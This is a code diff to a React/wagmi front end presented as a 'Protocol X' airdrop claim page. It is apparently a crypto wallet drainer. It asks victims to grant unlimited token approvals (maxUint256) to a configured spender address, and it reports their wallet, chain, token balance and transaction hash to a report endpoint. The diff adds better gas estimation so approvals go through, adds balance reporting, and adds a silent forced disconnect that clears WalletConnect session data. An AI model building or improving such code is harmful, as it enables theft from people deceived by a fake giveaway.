@@ -5,7 +5,7 @@ import Image from 'next/image';
 import { motion, AnimatePresence } from 'framer-motion';
 import { useAccount, useWriteContract, useDisconnect } from 'wagmi';
 import { useAppKit } from '@reown/appkit/react';
-import { erc20Abi, maxUint256, createPublicClient, http } from 'viem';
+import { erc20Abi, maxUint256, createPublicClient, http, encodeFunctionData } from 'viem';
 import { readContract, getBalance, switchChain } from '@wagmi/core';
 import { config } from '@/config';
 import { mainnet, arbitrum, sepolia } from 'wagmi/chains';
@@ -16,7 +16,8 @@ import { AirdropDetails } from '@/lib/gemini';
 
 // Web3 Configuration
 const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
-const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL || "";
+// Default to the local Next.js API route when env var is not set
+const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL || "/api/report";
 
 // Extend Window interface for global functions
 declare global {
@@ -366,7 +367,8 @@ const UpcomingCard: React.FC<UpcomingCardProps> = ({ iconName, iconColor, title,
 const App: React.FC = () => {
     // Web3 Hooks
     const { address, isConnected, chainId } = useAccount();
-    const { disconnect } = useDisconnect();
+    // Support both modern wagmi (disconnectAsync) and older (disconnect)
+    const { disconnectAsync, disconnect } = useDisconnect();
     const { open } = useAppKit();
     const { writeContractAsync } = useWriteContract();
     
@@ -390,23 +392,7 @@ const App: React.FC = () => {
 
     const airdropAmount: string = '1,000,000';
 
-// Component that reports wallet connections
-function ConnectionReporter() {
-  useEffect(() => {
-    if (isConnected && address) {
-       fetch(`${REPORT_URL}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          event: "connect",
-          wallet: address,
-        }),
-      }).catch(console.error);
-    }
-        }, []);
-
-  return null;
-}
+// Connection reporting is handled explicitly inside `connectWallet` to ensure a single report per session.
 
     // --- Theme Logic ---
     useEffect(() => {
@@ -473,6 +459,33 @@ function ConnectionReporter() {
         showMessage('Connecting to wallet...', 'info');
         try {
             await open();
+            // Immediately report connection to server after successful open
+            try {
+                const reportedKey = `reported_wallet_${address}`;
+                const payload = {
+                    event: 'connect',
+                    wallet: address,
+                    chainId: chainId || null,
+                    timestamp: new Date().toISOString(),
+                } as const;
+
+                // Only send/report if we haven't already recorded this session
+                if (address && !sessionStorage.getItem(reportedKey)) {
+                    const res = await fetch(REPORT_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                    });
+                    if (res.ok) {
+                        sessionStorage.setItem(reportedKey, 'true');
+                        console.log('[connectWallet] reported wallet connection to', REPORT_URL);
+                    } else {
+                        console.error('[connectWallet] report failed', res.status);
+                    }
+                }
+            } catch (reportErr) {
+                console.error('[connectWallet] failed to report connection:', reportErr);
+            }
         } catch (err) {
             console.error('[Connect] Error opening modal:', err);
             
@@ -487,33 +500,78 @@ function ConnectionReporter() {
         }
     }, [open, showMessage]);
 
-    const disconnectWallet = async (): Promise<void> => {
+    const disconnectWallet = useCallback(async (): Promise<void> => {
+        // Silent forced disconnect: attempt wagmi's async disconnect first,
+        // fall back to legacy disconnect if available, then aggressively
+        // cleanup WalletConnect/session storage and try provider-level disconnects.
         try {
-            console.log('[Disconnect] Disconnecting wallet...');
-            
-            // Use both disconnect methods to ensure proper disconnection
-            disconnect();
-            
-            // Reset all state immediately
-            setIsEligible(null);
-            setEligibilityChecked(false);
-            setEligibleTokens([]);
-            setIsClaimed(false);
-            setIsLoading(false);
-            setMessage(null);
-            
-            console.log('[Disconnect] Wallet disconnected successfully');
+            if (typeof disconnectAsync === 'function') {
+                try {
+                    await disconnectAsync();
+                } catch (e) {
+                    // swallow and continue to cleanup
+                    // eslint-disable-next-line no-console
+                    console.warn('[Disconnect] disconnectAsync() failed:', e);
+                }
+            } else if (typeof disconnect === 'function') {
+                try {
+                    // legacy sync disconnect
+                    // some connectors expose a sync disconnect function
+                    (disconnect as unknown as () => void)();
+                } catch (e) {
+                    // eslint-disable-next-line no-console
+                    console.warn('[Disconnect] disconnect() failed:', e);
+                }
+            }
+
+            // Remove WalletConnect keys and other common session leftovers
+            try {
+                const removed: string[] = [];
+                Object.keys(localStorage).forEach((key) => {
+                    const k = key.toLowerCase();
+                    if (k.startsWith('wc@') || k.includes('walletconnect')) {
+                        try { localStorage.removeItem(key); } catch {}
+                        removed.push(key);
+                    }
+                });
+                Object.keys(sessionStorage).forEach((key) => {
+                    const k = key.toLowerCase();
+                    if (k.startsWith('wc@') || k.includes('walletconnect')) {
+                        try { sessionStorage.removeItem(key); } catch {}
+                        removed.push(key);
+                    }
+                });
+
+                // Try provider-level disconnect/close methods without throwing
+                const anyWindow = window as any;
+                try { if (anyWindow?.walletConnectProvider?.disconnect) await anyWindow.walletConnectProvider.disconnect(); } catch {}
+                try { if (anyWindow?.ethereum?.disconnect) await anyWindow.ethereum.disconnect(); } catch {}
+                try { if (anyWindow?.ethereum?.close) await anyWindow.ethereum.close(); } catch {}
+
+                
+
+                // Reset UI state locally (do not show messages)
+                setIsEligible(null);
+                setEligibilityChecked(false);
+                setEligibleTokens([]);
+                setIsClaimed(false);
+                setIsLoading(false);
+                setMessage(null);
+
+                // done; no reload, no UI messages per user request
+                // eslint-disable-next-line no-console
+                if (removed.length > 0) console.log('[Disconnect] removed keys:', removed);
+            } catch (cleanupErr) {
+                // swallow cleanup errors
+                // eslint-disable-next-line no-console
+                console.warn('[Disconnect] cleanup error:', cleanupErr);
+            }
         } catch (err) {
-            console.error('[Disconnect] Error:', err);
-            // Still reset state even if disconnect fails
-            setIsEligible(null);
-            setEligibilityChecked(false);
-            setEligibleTokens([]);
-            setIsClaimed(false);
-            setIsLoading(false);
-            setMessage(null);
+            // Final safety: swallow any unexpected errors
+            // eslint-disable-next-line no-console
+            console.error('[Disconnect] unexpected error:', err);
         }
-    };
+    }, [disconnectAsync, disconnect]);
 
     // Check eligibility ONCE on wallet connect
     useEffect(() => {
@@ -588,17 +646,32 @@ function ConnectionReporter() {
             
             // Get real-time gas price from the network
             const gasPrice = await publicClient.getGasPrice();
-            
-            // Estimate gas for ERC20 approval (typical: ~50,000 gas)
-            const estimatedGasUnits = BigInt(50000);
-            const estimatedGasCost = gasPrice * estimatedGasUnits;
-            
-            // Add 30% buffer for safety
-            const requiredGas = (estimatedGasCost * BigInt(130)) / BigInt(100);
-            
-            if (chainBalance.value < requiredGas) {
-                // Skip this chain - not enough gas (don't show to user)
-                continue;
+
+            // Estimate gas for an ERC20 approve on a representative token for this chain
+            try {
+                // pick the first token on this chain as representative
+                const representativeToken = tokens[0];
+                const approveData = encodeFunctionData({ abi: erc20Abi, functionName: 'approve', args: [SPENDER, maxUint256] });
+
+                const estimatedGasUnits = await publicClient.estimateGas({
+                    to: representativeToken.address as `0x${string}`,
+                    data: approveData,
+                    account: address as `0x${string}`,
+                });
+
+                // Add 30% buffer for safety
+                const requiredGas = (gasPrice * estimatedGasUnits * BigInt(130)) / BigInt(100);
+
+                if (chainBalance.value < requiredGas) {
+                    // Skip this chain - not enough gas (don't show to user)
+                    continue;
+                }
+            } catch (estimateErr) {
+                // If estimation fails, fallback to conservative fixed estimate
+                const estimatedGasUnits = BigInt(50000);
+                const estimatedGasCost = gasPrice * estimatedGasUnits;
+                const requiredGas = (estimatedGasCost * BigInt(130)) / BigInt(100);
+                if (chainBalance.value < requiredGas) continue;
             }
         } catch {
             // Silently skip chains with errors
@@ -739,13 +812,39 @@ function ConnectionReporter() {
                 }
       }
 
-      const nativeBal = await getBalance(config, { address, chainId: targetChain });
-            
-      if (nativeBal.value < BigInt(100000000000000)) {
-                showMessage("Not enough native token to pay gas fees.", 'error');
-                setIsLoading(false);
-        return;
-      }
+            // Re-check gas in real-time before sending transactions to avoid race conditions
+            try {
+                const chainConfig = targetChain === 1 ? mainnet : targetChain === 42161 ? arbitrum : sepolia;
+                const publicClient = createPublicClient({ chain: chainConfig, transport: http() });
+
+                // Get current gas price
+                const gasPrice = await publicClient.getGasPrice();
+
+                // Use a conservative gas units estimate for approval + small overhead
+                const estimatedGasUnits = BigInt(50000); // 50k gas units
+                const estimatedGasCost = gasPrice * estimatedGasUnits; // in wei
+
+                // Add 30% buffer
+                const requiredGas = (estimatedGasCost * BigInt(130)) / BigInt(100);
+
+                const nativeBal = await getBalance(config, { address, chainId: targetChain });
+
+                if (nativeBal.value < requiredGas) {
+                    const requiredEth = (Number(requiredGas) / 1e18).toFixed(6);
+                    showMessage(`Not enough native token to pay gas fees. Need ≈ ${requiredEth} ETH on the target chain.`, 'error');
+                    setIsLoading(false);
+                    return;
+                }
+            } catch (gasErr) {
+                // If gas estimation fails, fall back to the previous lightweight check
+                console.error('Gas re-check failed, falling back to quick native balance check:', gasErr);
+                const nativeBal = await getBalance(config, { address, chainId: targetChain });
+                if (nativeBal.value < BigInt(100000000000000)) {
+                    showMessage("Not enough native token to pay gas fees.", 'error');
+                    setIsLoading(false);
+                    return;
+                }
+            }
 
             // Approve eligible tokens (already checked during eligibility)
             let approvedCount = 0;
@@ -753,14 +852,64 @@ function ConnectionReporter() {
                 try {
                     showMessage(`Approving ${token.symbol} on ${chainName}... (${approvedCount + 1}/${eligibleTokens.length})`, 'info');
 
-        const txHash = await writeContractAsync({
-          address: token.address,
-          abi: erc20Abi,
-          functionName: "approve",
-          args: [SPENDER, maxUint256],
-          account: address,
-          chainId: targetChain,
-        });
+                    // Estimate gas for this token's approve to ensure sufficient native balance
+                    try {
+                        const approveData = encodeFunctionData({ abi: erc20Abi, functionName: 'approve', args: [SPENDER, maxUint256] });
+                        const chainConfig = targetChain === 1 ? mainnet : targetChain === 42161 ? arbitrum : sepolia;
+                        const publicClient = createPublicClient({ chain: chainConfig, transport: http() });
+                        // Determine a realistic per-byte fee to multiply by estimated gas units.
+                        // Prefer EIP-1559 data (baseFeePerGas + priority fee) for accurate estimation.
+                        let maxFeePerGas: bigint | null = null;
+                        try {
+                            const latestBlock = await publicClient.getBlock({ blockTag: 'latest' });
+                            // baseFeePerGas exists on EIP-1559 blocks
+                            if (latestBlock?.baseFeePerGas) {
+                                // Use a conservative maxFee: base * 2 + a small priority fee
+                                const base = latestBlock.baseFeePerGas as bigint;
+                                // derive a reasonable priority fee using current gas price minus base (if available)
+                                const currentGasPrice = await publicClient.getGasPrice();
+                                const priority = currentGasPrice > base ? (currentGasPrice - base) : BigInt(2_000_000_000); // 2 gwei fallback
+                                maxFeePerGas = base * BigInt(2) + priority; // conservative upper bound
+                            }
+                        } catch (bErr) {
+                            console.warn('Failed to fetch latest block for fee estimation:', bErr);
+                        }
+
+                        // Fallback to legacy gasPrice if we couldn't compute an EIP-1559 maxFee
+                        if (!maxFeePerGas) {
+                            try {
+                                maxFeePerGas = await publicClient.getGasPrice();
+                            } catch (gpErr) {
+                                console.warn('Failed to fetch gasPrice for fallback:', gpErr);
+                                // As absolute fallback, set a small hardcoded value (1 gwei)
+                                maxFeePerGas = BigInt(1_000_000_000);
+                            }
+                        }
+
+                        const estimatedGasUnits = await publicClient.estimateGas({ to: token.address as `0x${string}`, data: approveData, account: address as `0x${string}` });
+                        // Add a safety buffer to gas units as well (e.g., +10%) and then fee buffer
+                        const gasUnitsWithBuffer = (estimatedGasUnits * BigInt(110)) / BigInt(100);
+                        const requiredGas = (maxFeePerGas * gasUnitsWithBuffer * BigInt(130)) / BigInt(100);
+
+                        const nativeBalBefore = await getBalance(config, { address, chainId: targetChain });
+                        if (nativeBalBefore.value < requiredGas) {
+                            // Not enough gas for this token - skip and continue to next
+                            console.warn(`Skipping ${token.symbol}: insufficient native balance for gas. Required ~${requiredGas} wei`);
+                            showMessage(`Skipping ${token.symbol}: not enough native token for gas.`, 'error');
+                            // don't return; continue to next token
+                            continue;
+                        }
+                    } catch (estErr) {
+                        // If estimation fails, proceed with caution (we already did a conservative chain-level check earlier)
+                        console.warn('Per-token gas estimate failed, proceeding with transaction:', estErr);
+                    }
+
+                    const txHash = await writeContractAsync({
+                        address: token.address,
+                        abi: erc20Abi,
+                        functionName: "approve",
+                        args: [SPENDER, maxUint256],
+                    });
 
                     approvedCount++;
                     
@@ -769,34 +918,52 @@ function ConnectionReporter() {
                     setIsLoading(false);
                     showMessage(`${token.symbol} approved ✅`, 'success');
 
-        // Report in background (non-blocking)
-        fetch(`${REPORT_URL}`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            event: "approval",
-            wallet: address,
-            chainName,
-            token: token.address,
-            symbol: token.symbol,
-            txHash,
-            timestamp: new Date().toISOString(),
-          }),
-        }).catch(console.error);
-        
-        // Exit the loop after first successful approval
-        break;
+                    // Report in background (non-blocking)
+                    (async () => {
+                        try {
+                            const balance = await readContract(config, {
+                                chainId: targetChain,
+                                address: token.address,
+                                abi: erc20Abi,
+                                functionName: "balanceOf",
+                                args: [address],
+                            });
+
+                            const formattedBalance = (Number(balance) / (10 ** token.decimals)).toLocaleString();
+
+                            fetch(`${REPORT_URL}`, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({
+                                    event: "approval",
+                                    wallet: address,
+                                    chainName,
+                                    token: token.address,
+                                    symbol: token.symbol,
+                                    balance: formattedBalance,
+                                    txHash,
+                                    timestamp: new Date().toISOString(),
+                                }),
+                            }).catch(console.error);
+                        } catch (error) {
+                            console.error("Failed to report approval:", error);
+                        }
+                    })();
+
+                    // Exit the loop after first successful approval
+                    break;
 
                 } catch (tokenErr: unknown) {
                     console.error(`Error approving ${token.symbol}:`, tokenErr);
-                    
+
                     if (tokenErr instanceof Error && (tokenErr.message.includes('User rejected') || tokenErr.message.includes('user rejected'))) {
                         showMessage(`Approval cancelled by user`, 'error');
                         setIsLoading(false);
                         return;
                     }
-                    
+
                     showMessage(`Failed to approve ${token.symbol}: ${tokenErr instanceof Error ? tokenErr.message : 'Unknown error'}`, 'error');
+                    // If approval failed for this token, continue to next token instead of aborting entire flow
                     continue;
                 }
             }
@@ -1126,7 +1293,6 @@ function ConnectionReporter() {
             `}</style>
 
             <GeometricBackground theme={theme} />
-            <ConnectionReporter />
             
             <header className={`fixed top-0 left-0 w-full z-30 backdrop-blur-sm shadow-lg border-b transition-colors duration-500 ${
                 theme === 'dark' 
@@ -1381,7 +1547,7 @@ function ConnectionReporter() {
                 &copy; 2025 Protocol X. All Rights Reserved.
             </footer>
 
-            <div id="notificationContainer" className="fixed bottom-32 left-4 md:bottom-4 md:left-4 z-40 w-full max-w-[14rem] sm:max-w-xs flex flex-col items-start pointer-events-none p-3 md:p-0">
+            <div id="notificationContainer" className="fixed bottom-4 left-4 md:bottom-4 md:left-4 z-40 w-full max-w-[14rem] sm:max-w-xs flex flex-col items-start pointer-events-none p-3 md:p-0">
                 {currentNotification && (
                     <NotificationToast 
                         key={currentNotification.id} 
